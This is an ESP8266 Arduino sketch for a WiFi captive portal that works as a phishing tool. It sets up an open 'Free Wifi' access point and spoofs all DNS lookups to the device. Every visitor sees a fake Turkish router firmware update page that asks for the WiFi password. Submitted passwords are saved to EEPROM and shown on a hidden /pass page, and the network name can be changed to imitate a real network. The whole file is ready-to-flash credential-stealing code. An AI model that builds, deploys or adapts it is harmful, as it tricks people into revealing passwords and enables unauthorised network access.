// Code for ESP8266 Wifi Captive Portal.

// Adding libraries.
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default main strings.
#define SUBTITLE "Yönlendirici bilgisi."
#define TITLE "Güncelleme"
#define BODY "Yönlendirici firmware'iniz güncel değil. Normal taramaya devam etmek için firmware'inizi güncelleyin."
#define POST_TITLE "Updating..."
#define POST_BODY "Yönlendiriciniz güncelleniyor. Lütfen işlem tamamlanana kadar bekleyin.. </br> Teşekkür ederim."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Initial system settings.
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

// Default wifi SSID name.
const char *SSID_NAME = "Free Wifi";

String allPass = "";     // For storing all passwords.
String newSSID = "";     // For adding new SSID.
String currentSSID = ""; // For storing the SSID in the EEPROM.

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName)
{
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer()
{
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t)
{
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; text-align:center; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em;  }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 5px; border: 1px solid #555555; color: #000000; }"
               "label { color: #333; display: block; text-align:center; font-style: italic; font-weight: bold; }"
               "nav { background: #fff; color: #4acbd6; text-align:center; display: block; font-size: 1.3em; padding: 0.8em; }"
               "nav b { display: block; text-align:center; font-size: 1.5em; margin-bottom: 0.1em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" +
             a + " :: " + t + "</title>"
                              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                              "<style>" +
             CSS + "</style>"
                   "<meta charset=\"UTF-8\"></head>"
                   "<body><div style=\"text-align:center;\"><img src='data:image/png;base64,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' alt=\"logo\"></div><nav><b>" +
             a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String index()
{
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi sifre:</label>" +
         "<input type=password name=m></input><input type=submit style=background-color: blue; value=Güncelleme></form>" + footer();
}

String posted()
{
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass()
{
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid()
{
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>" +
         "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID()
{
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i)
  {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return postedSSID;
}

String clear()
{
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK()
{
  // The BUILTIN_LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup()
{
  // Starting serial communication.
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read SSID in the EEPROM.
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0')
  {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid", []() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID", []() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  // Enable the BUILTIN_LED.
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop()
{
  if ((millis() - lastTick) > TICK_TIMER)
  {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
